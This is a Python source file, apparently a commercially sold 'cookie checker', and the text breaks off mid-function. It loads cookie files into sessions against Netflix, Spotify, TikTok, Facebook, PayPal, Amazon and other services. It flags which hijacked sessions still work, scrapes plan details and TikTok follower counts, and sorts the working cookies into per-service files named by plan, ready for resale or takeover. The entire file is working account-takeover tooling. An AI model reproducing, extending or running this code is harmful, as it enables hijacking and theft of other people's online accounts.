#update 2025-11-11 - by @m3l0d1x
#seller ,support - @TSP1K3
#If there’s an error, please message me on Telegram so I can fix it quickly.
#If you disclose the tool, you will forfeit access to any further updates
import requests
import re
import os
import glob
import shutil
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import argparse
import itertools

try:
    from curl_cffi import requests as crequests
    HAS_CURL_CFFI = True
except ImportError:
    crequests = requests
    HAS_CURL_CFFI = False

CUSTOM_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0'

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'

    BG_RED = '\033[101m'
    BG_GREEN = '\033[102m'
    BG_YELLOW = '\033[103m'
    BG_BLUE = '\033[104m'

def prompt_user_agent():
    #make by @m3l0d1x
    global CUSTOM_USER_AGENT

    print()
    while True:
        print("Google search:  My User-Agent")
        user_agent = input("User-Agent: ").strip()
        if user_agent and len(user_agent) > 10:
            CUSTOM_USER_AGENT = user_agent
            print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} User-Agent set: {CUSTOM_USER_AGENT[:80]}{'...' if len(CUSTOM_USER_AGENT) > 80 else ''}")
            break
        else:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Invalid User-Agent. Please provide a valid User-Agent string.")
    print()

def parse_cookies_txt(content):
    #make by @m3l0d1x
    cookies = []
    lines = content.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
            
        parts = line.split('\t')
        if len(parts) < 7:
            continue
        
        domain, subd_flag, path, secure_flag, expires, name, value = parts
        
        cookies.append({
            'domain': domain,
            'path': path,
            'secure': secure_flag.upper() == 'TRUE',
            'expires': expires,
            'name': name,
            'value': value
        })
    
    return cookies

def filter_cookies_by_domain(cookies, target_domains):
    #make by @m3l0d1x
    filtered = []
    for cookie in cookies:
        for target_domain in target_domains:
            if cookie['domain'] == target_domain or cookie['domain'].endswith(target_domain):
                filtered.append(cookie)
                break
    return filtered

def get_status_icon(status):
    #make by @m3l0d1x
    if status == 'success':
        return f"{Colors.GREEN}[LIVE]{Colors.RESET}"
    elif status == 'dead':
        return f"{Colors.RED}[DIE]{Colors.RESET}"
    else:
        return f"{Colors.YELLOW}[UNKNOWN]{Colors.RESET}"

def clean_filename(text):
    #make by @m3l0d1x
    import re
    
    if not text or not text.strip():
        return "unnamed"
    
    invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*', '\x00']
    for char in invalid_chars:
        text = text.replace(char, '_')
    
    text = re.sub(r'[\x00-\x1f\x7f-\x9f]', '_', text)
    
    text = text.replace(' ', '_').replace('__', '_').strip('_.')
    
    windows_reserved = [
        'CON', 'PRN', 'AUX', 'NUL',
        'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9',
        'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'
    ]
    
    name_only = text.split('.')[0].upper()
    if name_only in windows_reserved:
        text = f"file_{text}"
    
    if text.replace('.', '').strip() == '':
        text = "unnamed"
    
    if len(text) > 200:
        text = text[:200]
    
    text = text.rstrip('. ')
    
    if not text:
        text = "unnamed"
    
    return text

def get_unique_filename(output_folder, filename):
    #make by @m3l0d1x
    base_name = filename.replace('.txt', '')
    counter = 1
    unique_filename = filename
    
    while os.path.exists(os.path.join(output_folder, unique_filename)):
        unique_filename = f"{base_name}_{counter}.txt"
        counter += 1
        if counter > 10000:
            unique_filename = f"{base_name}_{int(time.time())}.txt"
            break
    
    return unique_filename

def create_service_folders(output_folder):
    services = ['Netflix', 'Spotify', 'TikTok', 'Facebook', 'Canva', 'Roblox', 'Instagram', 'YouTube', 'LinkedIn', 'Amazon', 'WordPress', 'CapCut', 'PayPal']

    print(f"{Colors.CYAN}[FOLDER]{Colors.RESET} Creating service folders in: {output_folder}")
    for service in services:
        service_folder = os.path.join(output_folder, service)
        if not os.path.exists(service_folder):
            os.makedirs(service_folder, exist_ok=True)
            print(f"  {Colors.GREEN}[CREATED]{Colors.RESET} {service}/")
        else:
            existing_files = [f for f in os.listdir(service_folder) if f.endswith('.txt')]
            print(f"  {Colors.BLUE}[EXISTS]{Colors.RESET} {service}/ ({len(existing_files)} existing files)")

def save_live_cookies(batch_results, output_folder):
    #make by @m3l0d1x
    try:

        if not os.path.exists(output_folder):
            os.makedirs(output_folder, exist_ok=True)

        saved_files = []
        live_count = 0

        for result in batch_results.get('all_results', []):
            file_path = result.get('file_path', '')
            folder_name = result.get('folder_name', 'Unknown')
            file_name = result.get('file_name', 'Unknown')
            
            for service in ['netflix', 'spotify', 'tiktok', 'facebook', 'canva', 'roblox', 'instagram', 'youtube', 'linkedin', 'amazon', 'wordpress', 'capcut', 'paypal']:
                if service in result.get('results', {}):
                    service_result = result['results'][service]
                    
                    if service_result.get('status') == 'success':
                        if service.lower() == 'netflix':
                            plan_info = service_result.get('plan_info', '')
                            if 'Plan:' in plan_info:
                                plan_name = plan_info.split('Plan:')[1].split('|')[0].strip()
                                plan_name = clean_filename(plan_name) if plan_name else 'Unknown'
                            else:
                                plan_name = 'Unknown'
                            service_file_name = f"Netflix-{plan_name}.txt"
                        
                        elif service.lower() == 'spotify':
                            plan_info = service_result.get('plan_info', '')
                            if 'Plan:' in plan_info:
                                plan_name = plan_info.split('Plan:')[1].split('|')[0].strip()
                                plan_name = clean_filename(plan_name) if plan_name else 'Unknown'
                            else:
                                plan_name = 'Unknown'
                            service_file_name = f"Spotify-{plan_name}.txt"
                        
                        elif service.lower() == 'tiktok':
                            plan_info = service_result.get('plan_info', '')
                            
                            username = None
                            followers = None
                            following = None
                            likes = None
                            videos = None
                            verified = False
                            
                            if 'User:' in plan_info:
                                username_part = plan_info.split('User:')[1].split('|')[0].strip()
                                username = username_part
                            
                            if 'Followers:' in plan_info:
                                followers_part = plan_info.split('Followers:')[1].split('|')[0].strip()
                                followers = followers_part
                            
                            if 'Following:' in plan_info:
                                following_part = plan_info.split('Following:')[1].split('|')[0].strip()
                                following = following_part
                            
                            if 'Likes:' in plan_info:
                                likes_part = plan_info.split('Likes:')[1].split('|')[0].strip()
                                likes = likes_part
                            
                            if 'Videos:' in plan_info:
                                videos_part = plan_info.split('Videos:')[1].split('|')[0].strip()
                                videos = videos_part

                            verified = 'Verified' in plan_info
                            
                            if username and followers and videos:
                                if verified:
                                    service_file_name = f"TikTok-@{clean_filename(username)}-{followers}F-{videos}V-Verified.txt"
                                else:
                                    service_file_name = f"TikTok-@{clean_filename(username)}-{followers}F-{videos}V.txt"
                            elif username and followers:
                                service_file_name = f"TikTok-@{clean_filename(username)}-{followers}F.txt"
                            elif username:
                                service_file_name = f"TikTok-@{clean_filename(username)}.txt"
                            else:
                                service_file_name = "TikTok-Account.txt"
                        
                        elif service.lower() == 'facebook':
                            service_file_name = "Facebook-Account.txt"
                        
                        elif service.lower() == 'canva':
                            plan_info = service_result.get('plan_info', '')
                            if 'Plan:' in plan_info:
                                plan_part = plan_info.split('Plan:')[1].strip()
                                if '|' in plan_part:
                                    plan_name = plan_part.split('|')[0].strip()
                                    payment_info = plan_part.split('|')[1].strip()
                                    plan_name = clean_filename(plan_name) if plan_name else 'Unknown'
                                    payment_info = clean_filename(payment_info) if payment_info else ''
                                    if payment_info:
                                        service_file_name = f"Canva-{plan_name}-{payment_info}.txt"
                                    else:
                                        service_file_name = f"Canva-{plan_name}.txt"
                                else:
                                    plan_name = plan_part.strip()
                                    plan_name = clean_filename(plan_name) if plan_name else 'Unknown'
                                    service_file_name = f"Canva-{plan_name}.txt"
                            else:
                                service_file_name = "Canva-Unknown.txt"
                        
                        elif service.lower() == 'roblox':
                            service_file_name = "Roblox-Account.txt"
                        
                        elif service.lower() == 'instagram':
                            service_file_name = "Instagram-Account.txt"
                        elif service.lower() == 'youtube':
                            service_file_name = "YouTube-Account.txt"
                        elif service.lower() == 'linkedin':
                            service_file_name = "LinkedIn-Account.txt"
                        elif service.lower() == 'amazon':
                            service_file_name = "Amazon-Account.txt"
                        elif service.lower() == 'wordpress':
                            service_file_name = "WordPress-Account.txt"
                        elif service.lower() == 'capcut':
                            service_file_name = "CapCut-Account.txt"
                        elif service.lower() == 'paypal':
                            service_file_name = "PayPal-Account.txt"
                        else:
                            continue
                        

                        service_name = service.title()
                        if service_name.lower() == 'youtube':
                            service_name = 'YouTube'
                        elif service_name.lower() == 'linkedin':
                            service_name = 'LinkedIn'
                        elif service_name.lower() == 'wordpress':
                            service_name = 'WordPress'
                        elif service_name.lower() == 'tiktok':
                            service_name = 'TikTok'
                        elif service_name.lower() == 'facebook':
                            service_name = 'Facebook'
                        elif service_name.lower() == 'instagram':
                            service_name = 'Instagram'
                        elif service_name.lower() == 'amazon':
                            service_name = 'Amazon'
                        elif service_name.lower() == 'roblox':
                            service_name = 'Roblox'
                        elif service_name.lower() == 'canva':
                            service_name = 'Canva'
                        elif service_name.lower() == 'netflix':
                            service_name = 'Netflix'
                        elif service_name.lower() == 'spotify':
                            service_name = 'Spotify'
                        elif service_name.lower() == 'capcut':
                            service_name = 'CapCut'
                        elif service_name.lower() == 'paypal':
                            service_name = 'PayPal'
                        
                        service_folder = os.path.join(output_folder, service_name)
                        if not os.path.exists(service_folder):
                            os.makedirs(service_folder, exist_ok=True)

                        service_file_name = get_unique_filename(service_folder, service_file_name)
                        service_file_path = os.path.join(service_folder, service_file_name)
                        
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                        except UnicodeDecodeError:
                            encodings = ['utf-8-sig', 'latin-1', 'cp1252']
                            content = None
                            for encoding in encodings:
                                try:
                                    with open(file_path, 'r', encoding=encoding) as f:
                                        content = f.read()
                                    break
                                except UnicodeDecodeError:
                                    continue
                            
                            if content is None:
                                print(f"{Colors.RED}[ERROR]{Colors.RESET} Cannot read {file_path} - encoding error")
                                continue
                        
                        cookies = parse_cookies_txt(content)
                        
                        if service.lower() == 'netflix':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['netflix']['domains'])
                        elif service.lower() == 'spotify':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['spotify']['domains'])
                        elif service.lower() == 'tiktok':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['tiktok']['domains'])
                        elif service.lower() == 'facebook':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['facebook']['domains'])
                        elif service.lower() == 'canva':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['canva']['domains'])
                        elif service.lower() == 'roblox':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['roblox']['domains'])
                        elif service.lower() == 'instagram':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['instagram']['domains'])
                        elif service.lower() == 'youtube':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['youtube']['domains'])
                        elif service.lower() == 'linkedin':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['linkedin']['domains'])
                        elif service.lower() == 'amazon':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['amazon']['domains'])
                        elif service.lower() == 'wordpress':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['wordpress']['domains'])
                        elif service.lower() == 'capcut':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['capcut']['domains'])
                        elif service.lower() == 'paypal':
                            service_cookies = filter_cookies_by_domain(cookies, SCAN_TARGETS['paypal']['domains'])
                        else:
                            continue
                        
                        if service_cookies:
                            with open(service_file_path, 'w', encoding='utf-8') as f:
                                for cookie in service_cookies:
                                    f.write(f"{cookie['domain']}\tTRUE\t{cookie['path']}\t{str(cookie['secure']).upper()}\t{cookie['expires']}\t{cookie['name']}\t{cookie['value']}\n")

                            saved_files.append(service_file_name)
                            live_count += 1
                            print(f"{Colors.GREEN}[SAVED]{Colors.RESET} {service.title()} ({len(service_cookies)} cookies): {service_file_name}")

        if saved_files:
            print(f"\n{Colors.CYAN}[SAVE]{Colors.RESET} Live Cookies Saved:")
            print(f"  {Colors.BLUE}[FOLDER]{Colors.RESET} Output folder: {output_folder}")
            print(f"  {Colors.GREEN}[SUCCESS]{Colors.RESET} Accounts saved: {live_count}")

            print(f"\n{Colors.YELLOW}[INFO]{Colors.RESET} All saved accounts: {', '.join(saved_files)}")
        else:
            print(f"\n{Colors.YELLOW}[WARNING]{Colors.RESET} No LIVE cookies found to save")

    except Exception as e:
        #make by @m3l0d1x
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Error saving live cookies: {e}")

def test_cookies_with_target(cookies, target_url, contains_text):
    #make by @m3l0d1x
    if not cookies:
        return {
            'status': 'no_cookies',
            'message': 'Không có cookies phù hợp cho domain này'
        }
    
    if 'roblox.com' in target_url.lower():
        return test_roblox_login(cookies)
    
    
    if 'instagram.com' in target_url.lower():
        return test_instagram_login(cookies)
    
    if 'youtube.com' in target_url.lower():
        return test_youtube_login(cookies)
    
    if 'linkedin.com' in target_url.lower():
        return test_linkedin_login(cookies)
    
    if 'amazon.com' in target_url.lower():
        return test_amazon_login(cookies)
    
    if 'wordpress.com' in target_url.lower():
        return test_wordpress_login(cookies)

    if 'capcut.com' in target_url.lower():
        return test_capcut_login(cookies)

    if 'paypal.com' in target_url.lower():
        return test_paypal_login(cookies)

    if 'facebook.com' in target_url.lower():

        required_cookies = ['c_user', 'xs', 'datr', 'fr', 'sb']
        cookie_names = [cookie['name'] for cookie in cookies]
        missing_cookies = [cookie for cookie in required_cookies if cookie not in cookie_names]
        
        if missing_cookies:

            return {
                'status': 'no_cookies',
                'message': f'Không đủ cookies Facebook (thiếu: {", ".join(missing_cookies)})',
                'final_url': target_url,
                'status_code': 200
            }
        else:

            return test_facebook_login(cookies)
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')

            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT
        }
        
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=True)
        
        if len(response.content) > 50 * 1024 * 1024:
            return {
                'status': 'error',
                'message': 'Response too large, skipping analysis',
                'final_url': response.url,
                'status_code': response.status_code
            }
        final_url = response.url
        status_code = response.status_code
        
        if 'login' in final_url.lower() or 'signin' in final_url.lower() or 'accounts.' in final_url.lower():
            return {
                'status': 'dead',
                'message': 'Cookie DEAD',
                'final_url': final_url,
                'status_code': status_code
            }
        
        if status_code == 200:
            if 'login' in final_url.lower() or 'signin' in final_url.lower() or 'accounts.' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD',
                    'final_url': final_url,
                    'status_code': status_code
                }
            
            elif contains_text and contains_text.lower() in response.text.lower():
                if 'tiktok.com' in target_url.lower():
                   
                    if 'tiktok.com/setting' in final_url.lower():
                       
                        username = extract_tiktok_username(response.text)
                        if username:
                            
                            profile_result = test_tiktok_profile(cookies, username)
                            if profile_result['status'] == 'success':
                                stats = profile_result['stats']
                                followers = stats['followers']
                                following = stats['following']
                                likes = stats['likes']
                                videos = stats.get('videos', '0')
                                verified = stats.get('verified', 'false')
                                
                               
                                plan_info = f"User: {username} | Followers: {followers} | Following: {following} | Likes: {likes} | Videos: {videos}"
                                if verified == 'true':
                                    plan_info += " | Verified"
                            else:
                                plan_info = f"User: {username} | Profile: {profile_result['message']}"
                        else:
                            plan_info = 'Status: LIVE - On setting page'
                        
                        return {
                            'status': 'success',
                            'message': 'Cookie LIVE - Access to setting page',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                    else:
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Redirected from setting',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': 'Status: DEAD - Cannot access setting'
                        }
                elif 'canva.com' in target_url.lower():
                    
                    canva_result = test_canva_login(cookies)
                    return canva_result
                
               
                plan_info = ""
                if 'spotify.com' in target_url.lower():
                    plan_info = extract_spotify_plan(response.text)
                elif 'netflix.com' in target_url.lower():
                    plan_info = extract_netflix_plan(response.text)
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Login successfully!',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            elif 'account' in final_url.lower() or 'overview' in final_url.lower() or 'membership' in final_url.lower() or 'billing' in final_url.lower():
                
                if 'canva.com' in target_url.lower():
                    canva_result = test_canva_login(cookies)
                    return canva_result
                
               
                plan_info = ""
                if 'spotify.com' in target_url.lower():
                    plan_info = extract_spotify_plan(response.text)
                elif 'netflix.com' in target_url.lower():
                    plan_info = extract_netflix_plan(response.text)
                
                if 'netflix.com' in target_url.lower():
                    
                    if 'account' in final_url.lower() and 'membership' not in final_url.lower():
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Not complete account',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                    
                    elif "Unknown" in plan_info or "Not found" in plan_info:
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Not complete account or no plan',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            else:
                if 'tiktok.com' in target_url.lower():
                   
                    if 'tiktok.com/setting' in final_url.lower():
                       
                        username = extract_tiktok_username(response.text)
                        if username:
                           
                            profile_result = test_tiktok_profile(cookies, username)
                            if profile_result['status'] == 'success':
                                stats = profile_result['stats']
                                followers = stats['followers']
                                following = stats['following']
                                likes = stats['likes']
                                videos = stats.get('videos', '0')
                                verified = stats.get('verified', 'false')
                                
                               
                                plan_info = f"User: {username} | Followers: {followers} | Following: {following} | Likes: {likes} | Videos: {videos}"
                                if verified == 'true':
                                    plan_info += " | Verified"
                            else:
                                plan_info = f"User: {username} | Profile: {profile_result['message']}"
                        else:
                            plan_info = 'Status: LIVE - On setting page'
                        
                        return {
                            'status': 'success',
                            'message': 'Cookie LIVE - Access to setting page',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                    else:
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Redirected from setting',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': 'Status: DEAD - Cannot access setting'
                        }
                elif 'facebook.com' in target_url.lower():
                   
                    facebook_result = test_facebook_login(cookies)
                    return facebook_result
                elif 'canva.com' in target_url.lower():
                   
                    canva_result = test_canva_login(cookies)
                    return canva_result
                else:
                    return {
                        'status': 'unknown',
                        'message': 'Cookie UNKNOWN - Unknown status',
                        'final_url': final_url,
                        'status_code': status_code
                    }
        else:
            if 'canva.com' in target_url.lower():
               
                canva_result = test_canva_login(cookies)
                return canva_result
            else:
                return {
                    'status': 'dead',
                    'message': f'Cookie DEAD - HTTP {status_code}',
                    'final_url': final_url,
                    'status_code': status_code
                }
            
    except Exception as e:
        #make by @m3l0d1x
        return {
            'status': 'error',
            'message': f'Error testing cookies: {str(e)}'
        }

def extract_spotify_plan(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        exact_plan_patterns = [
            r'<div[^>]*class="sc-15a2717d-5 gNnrac"[^>]*>.*?<span[^>]*class="[^"]*encore-text-title-medium[^"]*"[^>]*>([^<]+)</span>',
            r'<span[^>]*class="[^"]*encore-text-title-medium[^"]*"[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*gNnrac[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>'
        ]
        
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        subscription_div_patterns = [
            r'<div[^>]*class="[^"]*sc-15a2717d-5[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*gNnrac[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*dbRLzW[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>'
        ]
        
        for pattern in subscription_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        return "Plan: Unknown - Not found plan in subscription page"
        
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def test_netflix_login(cookies):
    #make by @m3l0d1x
    return test_cookies_with_target(cookies, "https://www.netflix.com/browse", "profiles")

def test_spotify_login(cookies):
    #make by @m3l0d1x
    return test_cookies_with_target(cookies, "https://www.spotify.com/account/overview/", "account")

def test_tiktok_login(cookies):
    #make by @m3l0d1x
    return test_cookies_with_target(cookies, "https://www.tiktok.com/setting", "setting")

def test_roblox_login(cookies):
    #make by @m3l0d1x
    try:
        session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Referer': 'https://www.roblox.com/'
        }
        
        target_url = "https://www.roblox.com/vi/home"
        response = session.get(target_url, headers=headers, timeout=30, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        
        if status_code == 200:
            if '/vi/home' in final_url:
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Logged into Roblox home page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: LIVE - On Roblox home page'
                }
            elif '/login' in final_url.lower() or '/vi/login' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to Roblox login page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Redirected to login'
                }
            else:
                return {
                    'status': 'unknown',
                    'message': f'Cookie UNKNOWN - Unexpected redirect to {final_url}',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: UNKNOWN - Unexpected redirect'
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code}'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Roblox: {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def test_instagram_login(cookies):
   
    try:
        
        session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.instagram.com/',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        target_url = "https://www.instagram.com/accounts/edit/"
        response = session.get(target_url, headers=headers, timeout=30, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        
        if status_code == 200:
            if '/accounts/edit/' in final_url:
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to Instagram edit page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: LIVE - On Instagram edit page'
                }
            elif '/accounts/login' in final_url.lower() or '/login' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to Instagram login page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Redirected to login'
                }
            else:
                return {
                    'status': 'unknown',
                    'message': f'Cookie UNKNOWN - Unexpected redirect to {final_url}',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: UNKNOWN - Unexpected redirect'
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code}'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Instagram: {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def extract_netflix_plan(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        exact_plan_patterns = [
            r'<h3[^>]*data-uia="account-membership-page\+plan-card\+title"[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<h3[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        membership_div_patterns = [
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*e1devdx33[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        
        for pattern in membership_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        return "Plan: Unknown - Not found plan in membership page"
        
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def extract_tiktok_plan(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        
        tiktok_indicators = [
            r'<div[^>]*class="[^"]*css-1tgbgko-5e6d46e3--DivLayoutNav[^"]*"[^>]*>',
            r'<div[^>]*class="[^"]*css-1hecd5w-5e6d46e3--DivNavScrollContainer[^"]*"[^>]*>',
            r'<div[^>]*data-e2e="nav-[^"]*"[^>]*role="tab"',
            r'<div[^>]*data-index="[^"]*"[^>]*role="tab"',
            
            r'data-e2e="nav-manage-account"',
            r'data-e2e="nav-privacy"',
            r'data-e2e="nav-push"',
            r'data-e2e="nav-business-account"',
            r'data-e2e="nav-ads"',
            r'data-e2e="nav-stm"',
            r'data-e2e="nav-keyword-filtering"',
            
            r'class="[^"]*css-1tgbgko-5e6d46e3--DivLayoutNav[^"]*"',
            r'class="[^"]*css-1hecd5w-5e6d46e3--DivNavScrollContainer[^"]*"',
            r'class="[^"]*css-y1al60-5e6d46e3--DivNavItem[^"]*"',
            r'class="[^"]*css-1cja238-5e6d46e3--SpanIconContainer[^"]*"',
            r'class="[^"]*css-1434rp1-5e6d46e3--SpanItemContent[^"]*"',
            r'class="[^"]*css-1boizxf-5e6d46e3--SpanItemContent[^"]*"',
            r'class="[^"]*css-2dl94e-5e6d46e3--SpanIconContainer[^"]*"',
            
            r'<svg[^>]*viewBox="0 0 48 48"[^>]*>.*?</svg>',
            r'<svg[^>]*viewBox="0 0 20 20"[^>]*>.*?</svg>',
            r'<path[^>]*fill-rule="evenodd"[^>]*>.*?</path>',
            
            r'aria-label="[^"]*"[^>]*role="tab"',
            r'aria-label="Manage account"',
            r'aria-label="Privacy"',
            r'aria-label="Push notifications"',
            r'aria-label="Business Account"',
            r'aria-label="Ads"',
            r'aria-label="Screen time"',
            r'aria-label="Content preferences"',
            
            r'href="/setting\?lang=[^"]*"',
            r'href="/setting"',
        ]
        
        tiktok_indicators_found = 0
        for pattern in tiktok_indicators:
            if re.search(pattern, html_content, re.IGNORECASE | re.DOTALL):
                tiktok_indicators_found += 1
        
        if tiktok_indicators_found >= 3:
            return "Status: Logged In"
        
        username_patterns = [
            r'<span[^>]*class="[^"]*username[^"]*"[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*nickname[^"]*"[^>]*>([^<]+)</div>'
        ]
        
        for pattern in username_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match and len(match.groups()) > 0:
                username = match.group(1).strip()
                if username and len(username) < 50:
                    return f"User: {username}"
        
        return "Status: Unknown - Not found login info"
        
    except Exception as e:
        return f"Status: Error when checking - {str(e)}"

def extract_tiktok_username(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        pattern = r'"uniqueId":"([^"]+)"'
        matches = re.findall(pattern, html_content)
        
        if matches:
            unique_usernames = list(set(matches))
            if unique_usernames:
                return unique_usernames[0]
        
        return None
        
    except Exception as e:
        return None

def extract_tiktok_profile_stats(html_content):
    
    try:
        import re
        
        
        patterns = {
            'followers': r'"followerCount":(\d+)',
            'following': r'"followingCount":(\d+)', 
            'likes': r'"heartCount":(\d+)',
            'videos': r'"videoCount":(\d+)',
            'verified': r'"verified":(true|false)',
        }
        
        
        stats = {}
        for key, pattern in patterns.items():
            match = re.search(pattern, html_content)
            stats[key] = match.group(1) if match else "0"
        
        return {
            'followers': stats['followers'],
            'following': stats['following'],
            'likes': stats['likes'],
